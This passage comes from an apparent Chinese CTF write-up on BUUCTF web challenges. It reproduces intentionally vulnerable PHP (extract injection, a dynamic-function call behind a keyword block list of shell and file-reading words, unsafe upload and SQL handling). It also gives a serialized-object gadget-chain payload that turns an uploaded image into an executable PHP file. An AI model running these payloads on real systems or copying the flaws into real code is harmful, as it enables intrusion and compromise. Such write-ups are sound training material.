class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h1><p>存在：/<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> </p><p>Profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $user_info=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,<span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'ID'</span>])-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($user_info[<span class="string">'img'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;img)&#123;</span><br><span class="line">            <span class="keyword">if</span>(db(<span class="string">'user'</span>)-&gt;where(<span class="string">'ID'</span>,$user_info[<span class="string">'ID'</span>])-&gt;data([<span class="string">"img"</span>=&gt;addslashes(<span class="keyword">$this</span>-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_cookie();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;success(<span class="string">'Upload img successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Upload file failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=end($ext_arr);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p=<span class="keyword">new</span> Profile();</span><br><span class="line">$r=<span class="keyword">new</span> Register();</span><br><span class="line">$p-&gt;img=<span class="string">"upload_img"</span>;</span><br><span class="line">$p-&gt;except=[<span class="string">"index"</span>=&gt;<span class="string">"img"</span>];</span><br><span class="line">$p-&gt;ext=<span class="string">"png"</span>;</span><br><span class="line">$p-&gt;filename_tmp=<span class="string">"../public/upload/d99081fe929b750e0557f85e6499103f/0fd406e401da2c937bd181b6c16c0083.png"</span>;</span><br><span class="line">$p-&gt;filename=<span class="string">"../public/upload/d99081fe929b750e0557f85e6499103f/0fd406e401da2c937bd181b6c16c0083.php"</span>;</span><br><span class="line"></span><br><span class="line">$r-&gt;checker=$p;</span><br><span class="line">$r-&gt;registed=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($r)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf2/6.png" alt=""></p><h1 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h1><h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><h1 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h1><h1 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h1><p>保持同一会话运算一千次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://3966ac42-b1a5-413c-851a-a241e5fa25ff.node3.buuoj.cn/index.php"</span></span><br><span class="line">s = session()</span><br><span class="line">rr = re.compile(<span class="string">r"[0-9]+ [+|-] [0-9]+"</span>)</span><br><span class="line"></span><br><span class="line">r = s.get(url)</span><br><span class="line">r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">data = &#123;<span class="string">"answer"</span>:eval(rr.findall(r.text)[<span class="number">0</span>])&#125;</span><br><span class="line">r = s.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">answer = eval(rr.findall(r.text)[<span class="number">0</span>])</span><br><span class="line">data = &#123; <span class="string">"answer"</span> : answer &#125;</span><br><span class="line">r = s.post( url , data=data)</span><br><span class="line">r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">print(<span class="string">'[+%d]:'</span>%(i) + str(answer))</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h1 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"r00t"</span>,<span class="string">"r00t"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>show.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">$show-&gt;Delete_All_Images();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $con;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 